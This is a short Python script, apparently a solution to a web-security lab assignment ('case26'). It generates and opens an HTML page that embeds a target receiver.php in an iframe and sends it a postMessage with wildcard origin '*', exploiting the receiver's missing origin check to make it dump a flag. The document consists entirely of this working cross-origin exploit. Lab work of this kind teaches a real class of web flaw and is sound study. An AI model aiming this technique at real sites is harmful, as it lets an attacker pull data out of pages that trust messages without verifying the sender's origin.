import webbrowser

# Exploit: receiver frame using the postMessage API dumps the flag
# if the origin is wrong

def main():
    html_string = """
    <html>
      <iframe id="evil" src="http://www.wsb.com/Assignment2/case26/receiver.php" width="600" height="600">
          Your browser does not support iframes
      </iframe>
      <script>
        window.onload = function() {
            var receiver = document.getElementById("evil").contentWindow;
            receiver.postMessage("lel", "*");
        }
      </script>
    </html>
    """
    with open("/tmp/case26.html", "wb") as f:
        f.write(html_string)
    webbrowser.open("/tmp/case26.html")

if __name__ == "__main__":
    main()
